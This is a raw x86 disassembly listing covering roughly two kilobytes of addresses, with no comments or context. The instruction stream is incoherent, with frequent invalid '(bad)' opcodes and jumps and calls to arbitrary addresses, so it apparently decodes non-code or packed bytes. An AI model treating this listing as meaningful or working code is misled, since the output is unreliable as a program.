  41921f:	mov    WORD PTR [esi+eiz*2+0x37],ds
  419223:	xchg   ebp,eax
  419224:	and    ch,0x37
  419227:	jns    0x419279
  419229:	jge    0x419201
  41922b:	shl    BYTE PTR [ecx-0x36],cl
  41922e:	adc    esp,esp
  419230:	or     ah,BYTE PTR [edx]
  419232:	add    DWORD PTR [edx+0x51],ebp
  419235:	adc    DWORD PTR [eax+0x2d4c8a1e],esp
  41923b:	push   eax
  41923c:	xchg   esi,eax
  41923d:	dec    edi
  41923e:	push   edx
  41923f:	jle    0x41927b
  419241:	mov    ecx,0x8fdfd672
  419246:	mov    ch,0x5f
  419248:	adc    ah,ah
  41924a:	cmp    esi,DWORD PTR ds:0xebb8089
  419250:	rol    DWORD PTR [edi],cl
  419252:	jns    0x4191fb
  419254:	xor    eax,0xc9d9fa54
  419259:	(bad)  
  41925a:	sub    BYTE PTR [edx],al
  41925c:	xchg   edi,eax
  41925d:	fiadd  DWORD PTR [eax]
  41925f:	push   ss
  419260:	push   ebp
  419261:	sub    al,0xf8
  419263:	int    0x2c
  419265:	jl     0x4192c5
  419267:	push   ebp
  419268:	jg     0x4191f3
  41926a:	lods   al,BYTE PTR ds:[esi]
  41926b:	enter  0x74ef,0xbf
  41926f:	push   0x54
  419271:	sbb    eax,0xe2e0d664
  419276:	dec    ebx
  419277:	sbb    eax,0xb6055b53
  41927c:	out    0x65,al
  41927e:	pop    esi
  41927f:	repnz div DWORD PTR [ebx-0x58]
  419283:	out    0x65,eax
  419285:	gs xchg ebp,eax
  419287:	mov    dh,0xc
  419289:	outs   dx,BYTE PTR ds:[esi]
  41928a:	test   al,0xdd
  41928c:	push   cs
  41928d:	and    al,0xd3
  41928f:	add    al,0xee
  419291:	jp     0x4192b8
  419293:	mov    esp,0x5bd91cad
  419298:	div    DWORD PTR [esi]
  41929a:	call   0xa733f08d
  41929f:	(bad)  
  4192a0:	rcr    BYTE PTR [edx],cl
  4192a2:	fs mov dl,0xb2
  4192a5:	pop    eax
  4192a6:	(bad)  
  4192a7:	(bad)  
  4192a9:	rcl    DWORD PTR [edi-0xa],0x64
  4192ad:	jmp    0x41924e
  4192af:	sub    BYTE PTR [eax+eax*1-0x24],0x9b
  4192b4:	xor    dh,al
  4192b6:	fst    st(0)
  4192b8:	dec    ecx
  4192b9:	jmp    0xfc2b3f6
  4192be:	call   0x4c:0x8c27af39
  4192c5:	dec    edx
  4192c6:	lock loopne 0x4192a6
  4192c9:	ja     0x419272
  4192cb:	cli    
  4192cc:	repnz imul edx,DWORD PTR [ebx],0xffffff98
  4192d0:	jl     0x4192a4
  4192d2:	xchg   ebp,ecx
  4192d4:	jnp    0x419303
  4192d6:	aas    
  4192d7:	mov    al,ds:0xe3f4a4b9
  4192dc:	mov    ah,0xe6
  4192de:	retf   0x2d38
  4192e1:	shl    BYTE PTR [edx+0x64],0x60
  4192e5:	aad    0x66
  4192e7:	xor    al,0x31
  4192e9:	arpl   WORD PTR [edi],si
  4192eb:	inc    esi
  4192ec:	aaa    
  4192ed:	push   edi
  4192ee:	in     al,dx
  4192ef:	js     0x4192fe
  4192f1:	jp     0x4192e4
  4192f3:	xchg   ecx,eax
  4192f4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4192f5:	pop    ebp
  4192f6:	xchg   ah,bh
  4192f8:	imul   ebp,DWORD PTR [edx+0x244211c8],0x46666c73
  419302:	xchg   DWORD PTR [ecx],edi
  419304:	out    0x66,eax
  419306:	fwait
  419307:	pop    DWORD PTR [esi]
  419309:	(bad)  
  41930b:	jmp    DWORD PTR [ebx]
  41930d:	out    0xf0,al
  41930f:	xchg   edi,eax
  419310:	mov    eax,ds:0xdae73f09
  419315:	xchg   ebx,eax
  419316:	das    
  419317:	jg     0x419332
  419319:	popa   
  41931a:	add    al,0x85
  41931c:	and    BYTE PTR [esi+0x37df2272],0x82
  419323:	shl    DWORD PTR [esi-0x70685f29],1
  419329:	test   al,0x47
  41932b:	push   ds
  41932c:	mov    DWORD PTR [esi+ecx*8+0x6d4be5a4],0xcda03910
  419337:	test   BYTE PTR gs:[ecx],dl
  41933a:	jmp    0x4193bb
  41933c:	iret   
  41933d:	and    dh,BYTE PTR [edi-0x7dec4d92]
  419343:	add    eax,0xa730d21b
  419348:	jl     0x419384
  41934a:	inc    eax
  41934b:	cld    
  41934c:	loope  0x419373
  41934e:	dec    esi
  41934f:	fwait
  419350:	rcl    BYTE PTR [ecx-0x36],0xa4
  419354:	lods   eax,DWORD PTR ds:[esi]
  419355:	aaa    
  419356:	jns    0x419316
  419358:	mov    bh,0x17
  41935a:	mov    ah,bl
  41935c:	sahf   
  41935d:	sub    al,0xd6
  41935f:	mov    eax,ds:0x768bfa27
  419364:	sbb    al,0x82
  419366:	stos   DWORD PTR es:[edi],eax
  419367:	pop    esi
  419368:	fist   DWORD PTR [ecx+0x2856846d]
  41936e:	cwde   
  41936f:	bound  edi,QWORD PTR [ebx+ebx*8+0x1ef6be85]
  419376:	adc    al,0xf6
  419378:	inc    edx
  419379:	loop   0x4193ac
  41937b:	push   cs
  41937c:	xor    eax,0x17fe9663
  419381:	pop    ebx
  419382:	mov    esp,0x3c2a672c
  419387:	push   esi
  419388:	jmp    0x1200a4a8
  41938d:	xor    bl,BYTE PTR [edi+ebp*8+0x6aac47ad]
  419394:	stos   BYTE PTR es:[edi],al
  419395:	mov    ebx,0x27376213
  41939a:	jae    0x4193c2
  41939c:	test   eax,0x37e1c835
  4193a1:	adc    cl,BYTE PTR [ebp-0x202d4dbb]
  4193a7:	fnstcw WORD PTR [eax]
  4193a9:	lds    edi,FWORD PTR [ecx-0x45]
  4193ac:	not    edx
  4193ae:	pop    ecx
  4193af:	das    
  4193b0:	int    0x44
  4193b2:	xchg   BYTE PTR [edx-0x2b],ch
  4193b5:	nop
  4193b6:	xlat   BYTE PTR ds:[ebx]
  4193b7:	fimul  WORD PTR [esi]
  4193b9:	xchg   edx,eax
  4193ba:	stos   BYTE PTR es:[edi],al
  4193bb:	in     al,dx
  4193bc:	fidivr WORD PTR [eax+0x23]
  4193bf:	push   eax
  4193c0:	shl    ebp,0x6
  4193c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4193c4:	outs   dx,BYTE PTR ds:[esi]
  4193c5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4193c6:	retf   
  4193c7:	mov    BYTE PTR [ebx+0x68],dl
  4193ca:	adc    ecx,DWORD PTR [ebx-0x48c30acb]
  4193d0:	push   esi
  4193d1:	xchg   BYTE PTR [eax-0x1eb55ebb],dh
  4193d7:	stc    
  4193d8:	xor    eax,0x80e062f9
  4193dd:	and    edi,DWORD PTR [edi+0x421e438c]
  4193e3:	xor    bl,bl
  4193e5:	push   ecx
  4193e6:	nop
  4193e7:	mov    bh,0xe4
  4193e9:	cmp    al,0x74
  4193eb:	sub    BYTE PTR [eax+edi*4+0x149bab06],bl
  4193f2:	jae    0x4193c1
  4193f4:	pop    ebx
  4193f5:	mov    ch,0x55
  4193f7:	enter  0x2cd8,0x9d
  4193fb:	xor    al,0x78
  4193fd:	jle    0x41941c
  4193ff:	pop    ebp
  419400:	sub    BYTE PTR [edi],bl
  419402:	out    dx,eax
  419403:	mov    esi,0x9c2e24b9
  419408:	jo     0x419477
  41940a:	sbb    dh,BYTE PTR [ecx+0x6069d7c3]
  419410:	div    DWORD PTR [edx+0x5b184737]
  419416:	fucomi st,st(2)
  419418:	adc    dh,BYTE PTR [eax-0x63e502fa]
  41941e:	das    
  41941f:	scas   al,BYTE PTR es:[edi]
  419420:	mov    ecx,0x2bc99be9
  419425:	stos   BYTE PTR es:[edi],al
  419426:	pop    ebp
  419427:	cld    
  419428:	div    DWORD PTR [edx+esi*2-0x55580197]
  41942f:	mov    ah,0x54
  419431:	(bad)  
  419432:	div    BYTE PTR [ecx-0x43]
  419435:	jmp    edi
  419437:	das    
  419438:	std    
  419439:	shl    DWORD PTR [edi+0x37],0x18
  41943d:	or     ecx,DWORD PTR [ebp-0x65]
  419440:	inc    eax
  419441:	dec    ecx
  419442:	inc    ecx
  419443:	outs   dx,DWORD PTR ds:[esi]
  419444:	lods   eax,DWORD PTR ds:[esi]
  419445:	pop    es
  419446:	cmp    eax,0x345db481
  41944b:	push   edx
  41944c:	ss leave 
  41944e:	push   0xad5d6248
  419453:	jl     0x41949c
  419455:	dec    ecx
  419456:	and    al,0x11
  419458:	cmp    BYTE PTR ss:[edx],0x52
  41945c:	push   esi
  41945d:	dec    esp
  41945e:	mov    ?,WORD PTR [esi-0x21118345]
  419464:	es mov edi,edx
  419467:	aam    0x5a
  419469:	loope  0x419459
  41946b:	fdivr  QWORD PTR [esi-0x66ac5388]
  419471:	rcr    DWORD PTR [ecx-0x3e6919ee],1
  419477:	mov    ds:0x4d3aacc7,eax
  41947c:	jne    0x4194e3
  41947e:	cs mov esp,0x90e05a1
  419484:	inc    eax
  419485:	sub    al,0xb4
  419487:	loop   0x419409
  419489:	adc    BYTE PTR [edx-0x6d],al
  41948c:	scas   al,BYTE PTR es:[edi]
  41948d:	scas   al,BYTE PTR es:[edi]
  41948e:	int3   
  41948f:	cld    
  419490:	lods   eax,DWORD PTR ds:[esi]
  419491:	jl     0x419439
  419493:	mov    ds:0x121e8574,eax
  419498:	ins    BYTE PTR es:[edi],dx
  419499:	into   
  41949a:	mov    edx,0xf96b1b1b
  41949f:	fcmovu st,st(3)
  4194a1:	addr16 xchg edi,eax
  4194a3:	push   eax
  4194a4:	js     0x419432
  4194a6:	imul   ecx,DWORD PTR [esi+0x26],0xffffffcb
  4194aa:	pop    ss
  4194ab:	mov    ds:0x2d89c5f0,eax
  4194b0:	mov    ecx,0x4455f297
  4194b5:	jbe    0x41950f
  4194b7:	jae    0x419491
  4194b9:	outs   dx,BYTE PTR ds:[esi]
  4194ba:	xlat   BYTE PTR ds:[ebx]
  4194bb:	pop    ebx
  4194bc:	loopne 0x41944d
  4194be:	mov    al,cl
  4194c0:	mov    cl,0x6e
  4194c2:	mov    ecx,0x10d3a09b
  4194c7:	sar    ch,0x27
  4194ca:	cmp    BYTE PTR [eax+0x9],ch
  4194cd:	cmp    BYTE PTR [eax+0x5b],0x49
  4194d1:	and    DWORD PTR [ebx+0x2318b7b7],0x9c99d308
  4194db:	popa   
  4194dc:	leave  
  4194dd:	aas    
  4194de:	nop
  4194df:	cld    
  4194e0:	mov    cl,0xa0
  4194e2:	idiv   DWORD PTR [ebx+0x57]
  4194e5:	sbb    al,0xc2
  4194e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194e8:	jne    0x41952e
  4194ea:	scas   eax,DWORD PTR es:[edi]
  4194eb:	out    0x8a,eax
  4194ed:	test   BYTE PTR [edi+0x51],bl
  4194f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4194f1:	nop
  4194f2:	sbb    DWORD PTR [ecx+0x4d243ec6],0xe1e0653f
  4194fc:	mov    eax,ds:0x284e850e
  419501:	fld    DWORD PTR [eax-0x5c]
  419504:	push   0xffffffb8
  419506:	popf   
  419507:	xlat   BYTE PTR ds:[ebx]
  419508:	jp     0x419567
  41950a:	mov    ds:0x1d1dad15,al
  41950f:	jecxz  0x419547
  419511:	mov    dl,0x2d
  419513:	sub    esi,0x2792e6f5
  419519:	call   0x1b11:0xa2c3b7d3
  419520:	jbe    0x419553
  419522:	mov    eax,0x5a2fb680
  419527:	test   BYTE PTR cs:[edx+0x16bed6ea],cl
  41952e:	loopne 0x419531
  419530:	adc    BYTE PTR [ebp-0x4aa72a96],ah
  419536:	cmc    
  419537:	imul   edi,DWORD PTR [edx+0x723d6dfa],0x40
  41953e:	xchg   ebp,eax
  41953f:	mov    ebp,0x72307946
  419544:	test   DWORD PTR [edx+0x5f],esp
  419547:	cmp    eax,ebp
  419549:	test   al,0x4f
  41954b:	les    ecx,FWORD PTR [ebx+0x7cc7f44d]
  419551:	retf   0x5792
  419554:	ret    0xe163
  419557:	mov    bl,0xf6
  419559:	fldenv ds:0xab241d78
  41955f:	xor    edx,DWORD PTR [esi-0x3aad476c]
  419565:	sub    eax,0x3aa9b4fc
  41956a:	pop    edi
  41956b:	scas   al,BYTE PTR es:[edi]
  41956c:	mov    cl,cl
  41956e:	inc    ebx
  41956f:	fild   QWORD PTR [ecx+0x58b554b4]
  419575:	dec    esi
  419576:	inc    ecx
  419577:	push   ecx
  419578:	and    al,0x60
  41957a:	dec    esi
  41957b:	out    0xeb,al
  41957d:	das    
  41957e:	test   eax,0x4cbc5621
  419583:	xor    BYTE PTR [esi-0x7c1e4356],bl
  419589:	mov    ds:0xf70ffc95,al
  41958e:	mov    dh,BYTE PTR [ebx]
  419590:	add    ebp,ebx
  419592:	mov    WORD PTR [edx*2+0x78ed97bd],?
  419599:	or     BYTE PTR [ebx-0x7b5e483b],ch
  41959f:	scas   al,BYTE PTR es:[edi]
  4195a0:	mov    DWORD PTR [ebp+edi*4-0x40ea6c7f],ebp
  4195a7:	and    eax,0xa1fadb0e
  4195ac:	cs out 0x4e,al
  4195af:	xor    cl,ah
  4195b1:	mov    bl,0x89
  4195b3:	lds    ecx,FWORD PTR [edx-0x2e]
  4195b6:	xor    DWORD PTR [di-0x12],0xfffffff7
  4195bb:	mov    bl,0x86
  4195bd:	sahf   
  4195be:	xchg   esi,eax
  4195bf:	fnstsw WORD PTR [edi-0x2840803d]
  4195c5:	or     esp,DWORD PTR ds:0x6ce40fec
  4195cb:	ja     0x41961b
  4195cd:	and    BYTE PTR [eax],ch
  4195cf:	dec    ebp
  4195d0:	stc    
  4195d1:	mov    ah,0xed
  4195d3:	call   0x7d7d9a67
  4195d8:	dec    ecx
  4195d9:	cmp    cl,al
  4195db:	sbb    ebp,esp
  4195dd:	jmp    0xd793ada1
  4195e2:	lods   al,BYTE PTR ds:[esi]
  4195e3:	inc    ecx
  4195e4:	es dec esi
  4195e6:	xchg   ebx,eax
  4195e7:	and    eax,0xe6653cdc
  4195ec:	push   DWORD PTR [edx+esi*4]
  4195ef:	mov    al,ds:0xc05d25e1
  4195f4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4195f5:	clc    
  4195f6:	jb     0x41965d
  4195f8:	das    
  4195f9:	(bad)  
  4195fb:	push   edi
  4195fc:	cmp    DWORD PTR [esi-0x1294820a],edx
  419602:	sahf   
  419603:	sti    
  419604:	shr    DWORD PTR [edi+edi*2],cl
  419607:	xchg   ecx,eax
  419608:	fst    QWORD PTR [ebx+0x21]
  41960b:	inc    eax
  41960c:	leave  
  41960d:	rol    DWORD PTR [eax+0x6d],1
  419610:	stos   BYTE PTR es:[edi],al
  419611:	mov    esp,0x17c2c704
  419616:	jne    0x41959a
  419618:	xchg   ebp,eax
  419619:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41961a:	push   0xfe0ba03f
  41961f:	or     al,0xed
  419621:	mov    ebx,ebx
  419623:	mov    dh,0x3a
  419625:	add    al,0xec
  419627:	retf   
  419628:	hlt    
  419629:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  41962b:	jecxz  0x419622
  41962d:	lock sahf 
  41962f:	and    eax,0xb5cac3e7
  419634:	sahf   
  419635:	mov    ds:0xde9eff04,eax
  41963a:	jnp    0x4195f5
  41963c:	pop    ds
  41963d:	or     dh,bl
  41963f:	ror    ch,0xea
  419642:	or     DWORD PTR [edi],esi
  419644:	mov    ah,0xc7
  419646:	lods   eax,DWORD PTR ds:[esi]
  419647:	lods   eax,DWORD PTR ds:[esi]
  419648:	xchg   ebp,eax
  419649:	sahf   
  41964a:	jp     0x41962d
  41964c:	pop    eax
  41964d:	ficomp DWORD PTR [esi]
  41964f:	dec    eax
  419650:	dec    ecx
  419651:	jae    0x41960c
  419653:	fs cs xor al,0x16
  419657:	jne    0x419657
  419659:	test   DWORD PTR [ecx],edi
  41965b:	push   esi
  41965c:	aas    
  41965d:	sbb    DWORD PTR [eiz*4-0x12db373],eax
  419664:	inc    ebp
  419665:	fprem1 
  419667:	jae    0x4195f0
  419669:	hlt    
  41966a:	xchg   BYTE PTR [edi-0x74],al
  41966d:	sbb    eax,0x1af5d74e
  419672:	or     DWORD PTR cs:[edi+0x3365101f],esp
  419679:	test   eax,0x5666097c
  41967e:	test   BYTE PTR [ebx],dh
  419680:	daa    
  419681:	and    edx,ebx
  419683:	cmp    al,dl
  419685:	fdiv   DWORD PTR [ebp+ebx*4+0x7e]
  419689:	or     al,0x33
  41968b:	test   al,0x4
  41968d:	cmp    eax,0x41885fe7
  419692:	xchg   esp,eax
  419693:	ins    DWORD PTR es:[edi],dx
  419694:	inc    ebp
  419695:	popa   
  419696:	mov    ebp,0x7dddb90a
  41969b:	fadd   QWORD PTR [edi]
  41969d:	inc    esi
  41969e:	jae    0x41968c
  4196a0:	jo     0x419670
  4196a2:	arpl   di,bx
  4196a4:	(bad)  
  4196a5:	mov    eax,ds:0x6a588da5
  4196aa:	pop    ebp
  4196ab:	loopne 0x41964c
  4196ad:	jae    0x41967d
  4196af:	retf   
  4196b0:	fld    QWORD PTR [esi-0x6d412bc6]
  4196b6:	pop    edx
  4196b7:	js     0x4196f5
  4196b9:	(bad)  
  4196ba:	fisttp QWORD PTR [esi+ebx*4-0xf2161c9]
  4196c1:	into   
  4196c2:	add    ah,ch
  4196c4:	in     eax,0xcb
  4196c6:	add    al,0x1c
  4196c8:	mov    WORD PTR [edi],ds
  4196ca:	jl     0x419658
  4196cc:	mov    ebp,0x61978c6c
  4196d1:	jb     0x419694
  4196d3:	loopne 0x419682
  4196d5:	mov    dh,dh
  4196d7:	cmp    DWORD PTR gs:[edx+ebx*1],ebx
  4196db:	push   edi
  4196dc:	inc    esi
  4196dd:	or     eax,0x2f16e2ed
  4196e2:	lock push edi
  4196e4:	cdq    
  4196e5:	fidivr WORD PTR es:[ebx+0xc33cc8c]
  4196ec:	push   0xfffffff3
  4196ee:	inc    edx
  4196ef:	dec    esp
  4196f0:	adc    eax,0xc666e5f8
  4196f5:	dec    esp
  4196f6:	sbb    cl,al
  4196f8:	imul   eax,DWORD PTR [edi],0x86edc767
  4196fe:	push   ds
  4196ff:	lods   eax,DWORD PTR ds:[esi]
  419700:	dec    ebx
  419701:	jae    0x4196c5
  419703:	mov    al,BYTE PTR [ebp+0x15]
  419706:	std    
  419707:	mov    es,WORD PTR [edx]
  419709:	aad    0xeb
  41970b:	lock cmp DWORD PTR [esi+esi*4+0x18],esp
  419710:	lods   al,BYTE PTR ds:[esi]
  419711:	js     0x419768
  419713:	push   esp
  419714:	adc    DWORD PTR [edi+0x75],ebx
  419717:	adc    ecx,DWORD PTR [ebx-0x6e]
  41971a:	loopne 0x419728
  41971c:	aas    
  41971d:	and    esp,edx
  41971f:	inc    eax
  419720:	call   ebx
  419722:	xor    ah,al
  419724:	std    
  419725:	hlt    
  419726:	ret    
  419727:	mov    ebx,0x3834f836
  41972c:	jno    0x419712
  41972e:	mov    ebx,DWORD PTR [eax+0x60]
  419731:	push   esp
  419732:	or     dl,BYTE PTR [eax+0x3e5fe428]
  419738:	sub    ah,ch
  41973a:	xor    BYTE PTR [esi+0x4ff6d80c],cl
  419740:	pop    es
  419741:	stc    
  419742:	dec    eax
  419743:	or     BYTE PTR [edi],0x9
  419746:	jge    0x419701
  419748:	push   eax
  419749:	push   ss
  41974a:	pop    ds
  41974b:	mov    esp,ecx
  41974d:	inc    esp
  41974e:	adc    al,BYTE PTR [ecx+0x4e]
  419751:	mov    ebx,0x6efce7f8
  419756:	ror    ebx,1
  419758:	pop    eax
  419759:	mov    esi,0xb9cf4c3a
  41975e:	mov    cs,WORD PTR [esp+edx*8]
  419761:	cmp    ebx,ebp
  419763:	add    ebp,DWORD PTR [ebp-0x798d666b]
  419769:	in     al,0x21
  41976b:	adc    eax,0x60adaccc
  419770:	xchg   ebp,eax
  419771:	rcr    BYTE PTR [ecx],cl
  419773:	fmul   DWORD PTR [ebx+0x25]
  419776:	sub    eax,0x95923257
  41977b:	mov    esi,0xc3e4d9be
  419780:	es fwait
  419782:	js     0x4197ef
  419784:	out    0x6,al
  419786:	int3   
  419787:	ja     0x419764
  419789:	ret    
  41978a:	pop    es
  41978b:	jbe    0x4197dd
  41978d:	cs mov cl,0xf0
  419790:	and    al,0x44
  419792:	(bad)  
  419794:	pop    ecx
  419795:	data16 jb 0x4197b5
  419798:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419799:	inc    ecx
  41979a:	sub    bh,bl
  41979c:	test   al,0xf4
  41979e:	xor    DWORD PTR [edx],edx
  4197a0:	dec    edx
  4197a1:	push   ebp
  4197a2:	clc    
  4197a3:	ret    0x34d7
  4197a6:	popf   
  4197a7:	mov    DWORD PTR [edx+edi*8],ecx
  4197aa:	std    
  4197ab:	test   DWORD PTR [eax-0x64],eax
  4197ae:	lds    ecx,FWORD PTR [ebx]
  4197b0:	ficomp WORD PTR [esi]
  4197b2:	dec    eax
  4197b3:	pusha  
  4197b4:	xor    bh,BYTE PTR [ecx-0x68]
  4197b7:	fnsave [eax]
  4197b9:	sbb    BYTE PTR [esi],al
  4197bb:	(bad)  
  4197bc:	fimul  WORD PTR ds:0x7f2060c8
  4197c2:	in     al,0xa0
  4197c4:	cld    
  4197c5:	and    ebp,DWORD PTR [ebx+0x6a7e6601]
  4197cb:	nop
  4197cc:	xor    ah,BYTE PTR gs:[eax-0x7acc6e3c]
  4197d3:	mov    ds:0xc5652ad7,al
  4197d8:	hlt    
  4197d9:	stos   DWORD PTR es:[edi],eax
  4197da:	outs   dx,BYTE PTR ds:[esi]
  4197db:	mov    DWORD PTR [edi],ecx
  4197dd:	div    bl
  4197df:	mov    ebx,edi
  4197e1:	test   ecx,esi
  4197e3:	xchg   esp,eax
  4197e4:	std    
  4197e5:	scas   al,BYTE PTR es:[edi]
  4197e6:	pushf  
  4197e7:	js     0x419825
  4197e9:	sar    BYTE PTR ds:0xea5dcfd5,1
  4197ef:	adc    DWORD PTR es:[ebp+esi*1+0x4fe73953],0xffffffcb
  4197f8:	sub    ch,dl
  4197fa:	mov    ecx,0xb39c6c0a
  4197ff:	push   ebp
  419800:	inc    BYTE PTR ds:0x2aff50ba
  419806:	loop   0x4197d1
  419808:	xchg   edi,eax
  419809:	add    al,0x80
  41980b:	xor    al,0xed
  41980d:	cmp    eax,0x2fcc3204
  419812:	jl     0x4197e4
  419814:	stos   BYTE PTR es:[edi],al
  419815:	mov    ?,WORD PTR [esi+0x7000b96]
  41981b:	(bad)  
  41981c:	xor    ebp,ebp
  41981e:	scas   al,BYTE PTR es:[edi]
  41981f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419820:	pop    edi
  419821:	and    BYTE PTR [esi-0x1334b149],0xea
  419828:	dec    ecx
  419829:	dec    eax
  41982a:	js     0x419828
  41982c:	adc    eax,0x2fa8ccc9
  419831:	pop    esp
  419832:	mov    bl,0x61
  419834:	mov    ebx,0x147314dd
  419839:	mov    ebx,0x2315954d
  41983e:	cli    
  41983f:	push   ebp
  419840:	lea    ecx,[eax+0x6c]
  419843:	int    0xca
  419845:	int    0x17
  419847:	mov    esp,0xca6d85aa
  41984c:	cli    
  41984d:	retf   0x6d30
  419850:	into   
  419851:	xlat   BYTE PTR ds:[ebx]
  419852:	inc    edi
  419853:	repnz scas al,BYTE PTR es:[edi]
  419855:	sub    BYTE PTR [edx],dl
  419857:	cmp    BYTE PTR [edx-0x509c7054],al
  41985d:	dec    DWORD PTR [ecx+0x5e4d7f03]
  419863:	into   
  419864:	int    0x2c
  419866:	rcr    esi,1
  419868:	sub    eax,0xdaa2dc23
  41986d:	push   ecx
  41986e:	push   0xd3cce419
  419873:	or     ebp,DWORD PTR [ebp-0x5005c515]
  419879:	cmp    eax,0xb73a2b72
  41987e:	mov    ah,0x95
  419880:	aam    0x52
  419882:	mov    eax,ds:0x70904404
  419887:	out    0x5a,al
  419889:	bound  edi,QWORD PTR ds:0x9c3e0d17
  41988f:	fs jecxz 0x4198f6
  419892:	ss sub al,0xd2
  419895:	call   DWORD PTR [eax+0x13]
  419898:	sbb    ch,al
  41989a:	sbb    eax,0x1c4f7086
  41989f:	jmp    0x419834
  4198a1:	ficomp WORD PTR [ebx-0x66]
  4198a4:	aad    0xc6
  4198a6:	iret   
  4198a7:	ret    
  4198a8:	or     DWORD PTR [eax],0x40127128
  4198ae:	hlt    
  4198af:	xchg   esp,eax
  4198b0:	jb     0x41991e
  4198b2:	das    
  4198b3:	lods   eax,DWORD PTR ds:[esi]
  4198b4:	mov    ch,0x13
  4198b6:	dec    ebp
  4198b7:	adc    edi,DWORD PTR [edi-0x80]
  4198ba:	icebp  
  4198bb:	(bad)  
  4198bd:	xor    edx,DWORD PTR [ecx-0x10]
  4198c0:	sub    cl,dl
  4198c2:	ds retf 0xa44f
  4198c6:	dec    ebp
  4198c7:	pop    es
  4198c8:	call   DWORD PTR [edi-0x46ca6cb6]
  4198ce:	cwde   
  4198cf:	retf   
  4198d0:	jne    0x419874
  4198d2:	arpl   dx,si
  4198d4:	sar    BYTE PTR [ebp+0x12439746],0x82
  4198db:	data16 adc ch,BYTE PTR [esi+edi*1]
  4198df:	dec    eax
  4198e0:	sahf   
  4198e1:	add    ecx,DWORD PTR [edi-0x4a]
  4198e4:	pop    ds
  4198e5:	pop    esp
  4198e6:	and    ch,BYTE PTR [eax]
  4198e8:	mov    ch,0x5
  4198ea:	popf   
  4198eb:	jg     0x419899
  4198ed:	retf   0x73e0
  4198f0:	adc    BYTE PTR [ecx],bl
  4198f2:	in     al,0x6c
  4198f4:	daa    
  4198f5:	arpl   WORD PTR [edi+0x6cf8f243],dx
  4198fb:	cmp    edi,ebx
  4198fd:	(bad)  
  4198fe:	dec    edi
  4198ff:	pop    edi
  419900:	or     al,0xb3
  419902:	or     cl,BYTE PTR [ebp-0x31632da6]
  419908:	sub    BYTE PTR fs:[esi+0x66e25e08],0x47
  419910:	xor    DWORD PTR [ebp-0x37],esp
  419913:	xchg   DWORD PTR [eax],ebp
  419915:	(bad)  
  419916:	leave  
  419917:	adc    DWORD PTR [ecx+eax*4+0x78dbc33b],ebx
  41991e:	mov    eax,ds:0x34d76668
  419923:	add    al,0x17
  419925:	sbb    eax,0x5045be84
  41992a:	cwde   
  41992b:	mov    ah,BYTE PTR [ebx-0xd57fbf8]
  419931:	mov    bh,0xe7
  419933:	mov    dh,0xae
  419935:	es daa 
  419937:	stos   DWORD PTR es:[edi],eax
  419938:	std    
  419939:	mov    WORD PTR [eax+0x535a6a23],cs
  41993f:	test   DWORD PTR [edi],0x7d893c41
  419945:	pop    ss
  419946:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419947:	cmp    DWORD PTR [ebp-0x7d],eax
  41994a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41994b:	xor    al,0x4e
  41994d:	or     eax,0xbb9d7205
  419952:	and    edi,DWORD PTR ds:0x272bcc74
  419958:	pop    edi
  419959:	aaa    
  41995a:	or     eax,0x42869dbf
  41995f:	pop    ecx
  419960:	xor    DWORD PTR [eax+0x51513001],ebp
  419966:	repz js 0x4199e6
  419969:	push   es
  41996a:	add    ch,ah
  41996c:	in     al,0x2
  41996e:	add    DWORD PTR [ecx+0x121fbdee],eax
  419974:	mov    dh,al
  419976:	aad    0x27
  419978:	fmul   DWORD PTR [edx-0x52]
  41997b:	jge    0x419950
  41997d:	(bad)  
  41997e:	loopne 0x4199d6
  419980:	and    DWORD PTR [ecx],edx
  419982:	dec    edx
  419983:	sti    
  419984:	push   ss
  419985:	nop
  419986:	inc    ecx
  419987:	addr16 dec esi
  419989:	xchg   edx,eax
  41998a:	jbe    0x4199a9
  41998c:	fisub  DWORD PTR [ecx+0x4c50a5f4]
  419992:	adc    bl,BYTE PTR [eax+0x1dd73a89]
  419998:	mov    bh,0x98
  41999a:	sbb    ebp,esp
  41999c:	addr16 jmp 0xd91a2cb
  4199a2:	adc    esp,DWORD PTR [esi+0x1c6ca74f]
  4199a8:	bound  ebx,QWORD PTR [ecx]
  4199aa:	or     eax,DWORD PTR gs:[esi-0x2251f11c]
  4199b1:	pop    esp
  4199b2:	enter  0x8b8f,0x12
  4199b6:	jb     0x4199d5
  4199b8:	pop    edi
  4199b9:	push   eax
  4199ba:	mov    dh,0x44
  4199bc:	mov    eax,0x3ebeebc2
  4199c1:	ret    
  4199c2:	mov    ch,0x75
  4199c4:	mov    ds:0x1d7c320f,eax
  4199c9:	es adc eax,0xbd9d3b57
  4199cf:	xchg   BYTE PTR [esi],cl
  4199d1:	fist   DWORD PTR [edi+edx*8-0x40]
  4199d5:	sub    esi,DWORD PTR [ebp-0x34]
  4199d8:	pop    eax
  4199d9:	pop    esp
  4199da:	int3   
  4199db:	or     DWORD PTR [edx],edi
  4199dd:	cmp    al,0xcf
  4199df:	mov    eax,0x9db4ca3e
  4199e4:	xchg   esi,eax
  4199e5:	imul   esi,ebp,0xafdcca69
  4199eb:	lds    esi,FWORD PTR [esi+ecx*4+0x5da62734]
  4199f2:	xor    BYTE PTR [edx+0x1e13532f],ah
  4199f8:	adc    esi,eax
  4199fa:	cwde   
  4199fb:	call   0x314a6363
  419a00:	add    BYTE PTR [ecx+eiz*8],bl
  419a03:	loopne 0x41998e
  419a05:	jmp    0xae41c6c5
  419a0a:	jmp    0xe25d:0xbf668953
  419a11:	cmp    al,0xbd
  419a13:	and    BYTE PTR [ebp-0x57],ch
  419a16:	fistp  DWORD PTR [esi+0x12]
  419a19:	or     BYTE PTR [ebx-0x67f36836],bl
  419a1f:	xor    edi,DWORD PTR [ecx+0x7d]
  419a22:	jecxz  0x419a08
  419a24:	mov    bh,0xc1
  419a26:	pop    es
  419a27:	mov    bl,0xb9
  419a29:	out    0x2f,al
